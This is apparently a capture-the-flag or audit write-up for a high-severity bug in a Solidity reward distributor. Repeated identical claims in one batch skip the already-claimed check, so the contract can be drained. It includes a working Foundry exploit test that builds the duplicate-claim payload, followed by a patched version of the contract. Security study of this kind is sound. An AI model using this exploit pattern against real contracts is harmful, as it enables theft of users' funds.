# [H-01] Missing `wordPosition` State Synchronization and Validation Allows Arbitrary Token Drainage via Duplicate Claims Inside Batches

## Severity
High

## Vulnerability Details
The `TheRewarderDistributor` contract allows users to claim rewards across multiple tokens and batches simultaneously by passing an array of `Claim` structures. To optimize gas and minimize expensive storage writes, the contract implements a bitmask accumulator system (`bitsSet`) to bundle multiple claims before committing them to storage via the internal `_setClaimed` function.

However, the state synchronization logic inside the loop is fundamentally flawed:

```solidity
if (token != inputTokens[inputClaim.tokenIndex]) {
    if (address(token) != address(0)) {
        if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
    }

    token = inputTokens[inputClaim.tokenIndex];
    bitsSet = 1 << bitPosition; // set bit at given position
    amount = inputClaim.amount;
} else {
    bitsSet = bitsSet | 1 << bitPosition;
    amount += inputClaim.amount;
}
```
The contract only triggers a storage validation and update (_setClaimed) under two specific conditions:

1. When the iteration encounters a different token asset (`token != inputTokens[inputClaim.tokenIndex]`).

2. When the loop reaches the absolute end of the `input array (i == inputClaims.length - 1)`.

If an attacker crafts a malicious `inputClaims` array consisting entirely of duplicate claims pointing to the same token asset and the same batch (e.g., `batchNumber = 0`), the execution path will persistently fall into the `else` branch 

Inside the `else` branch, the bitwise operation `bitsSet = bitsSet | 1 << bitPosition` is executed repeatedly. Because `bitPosition` remains completely identical across all elements, performing a bitwise `OR` on the same bit is an idempotent operation (1 | 1 = 1). The bitmask never mutates or shifts.

Crucially, because the token does not change, `_setClaimed` is never called during intermediate iterations to verify if the bit position was already claimed. Meanwhile, the contract executes the external transfer call on every single iteration:

```solidity
inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
```
When the loop finally completes, the check `if (i == inputClaims.length - 1)` fires, invoking `_setClaimed` once with the stale, unshifted bitmask. Since the storage slot for this user and batch was previously uninitialized (`0`), the single check passes successfully, marking the batch as claimed only after the contract has already transferred out the tokens multiple times.

## Impact

An attacker can completely drain the distributor contract's balance of any token asset they have a single valid Merkle proof for, bypassing airdrop distribution mechanics and depriving legitimate users of rewards.

## Proof of Concept (PoC)

An attacker can execute this exploit within a single transaction using a forged array. In the following Foundry exploit test snippet, assuming a player holds a valid Merkle proof for `batchNumber = 0` with an authorized amount of `playerDvtAmount`, they can construct the payload as follows:

```solidity
function test_theRewarder_exploit() public {
    uint256 playerIndex = 188; 
    uint256 playerDvtAmount = 115243125243125;

    // Calculate how many times we need to duplicate the claim to drain the remaining contract balance
    uint256 currentRemaining = distributor.getRemaining(address(dvt));
    uint256 requiredLoops = (currentRemaining / playerDvtAmount) + 1;

    // Fetch the valid Merkle proof for our legitimate claim slot
    bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, playerIndex);

    IERC20[] memory targetTokens = new IERC20[](1);
    targetTokens[0] = IERC20(address(dvt));

    // Construct the duplicate batch array payload
    Claim[] memory exploitClaims = new Claim[](requiredLoops);
    for (uint256 i = 0; i < requiredLoops; i++) {
        exploitClaims[i] = Claim({
            batchNumber: 0,
            amount: playerDvtAmount,
            tokenIndex: 0, 
            proof: dvtProof
        });
    }

    // Trigger the multi-claim drainage
    vm.prank(player);
    distributor.claimRewards({inputClaims: exploitClaims, inputTokens: targetTokens});

    // Verification: Assert contract balance has been successfully drained
    assertEq(dvt.balanceOf(address(distributor)), 0);
}
```

## Tools Used

Manual Review, Foundry, Parrot OS Dev Environment.

## Recommendation

Introduce an explicit synchronization state tracking variable (`lastWordPosition`) to detect whenever a claim shifts to a completely different storage word slot, and enforce that the intermediate storage update checks are executed if either the underlying token changes OR the targeted storage slot tracking changes.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

// ... (imports remain unchanged)

contract TheRewarderDistributor {
    // ... (state variables remain unchanged)

    function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
        Claim memory inputClaim;
        IERC20 token;
        uint256 bitsSet; 
        uint256 amount;
        uint256 lastWordPosition; // Cached word position tracking index

        for (uint256 i = 0; i < inputClaims.length; i++) {
            inputClaim = inputClaims[i];

            uint256 wordPosition = inputClaim.batchNumber / 256;
            uint256 bitPosition = inputClaim.batchNumber % 256;

            // FIX: Flush changes if token changes OR if the batch number crosses into a new storage word bounds
            if (token != inputTokens[inputClaim.tokenIndex] || lastWordPosition != wordPosition) {
                
                // Commit accumulated states to persistent storage slots safely
                if (address(token) != address(0)) {
                    if (!_setClaimed(token, amount, lastWordPosition, bitsSet)) revert AlreadyClaimed();
                }

                // Synchronize and lock the new caching boundaries
                token = inputTokens[inputClaim.tokenIndex];
                lastWordPosition = wordPosition; 
                bitsSet = 1 << bitPosition; 
                amount = inputClaim.amount;
            } else {
                // If it evaluates to the same token AND the same word slot, check for internal duplicate bits inside the local accumulator
                if ((bitsSet & (1 << bitPosition)) != 0) revert AlreadyClaimed();
                
                bitsSet = bitsSet | 1 << bitPosition;
                amount += inputClaim.amount;
            }

            if (i == inputClaims.length - 1) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }

            bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
            bytes32 root = distributions[token].roots[inputClaim.batchNumber];

            if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();

            inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
        }
    }
}
```
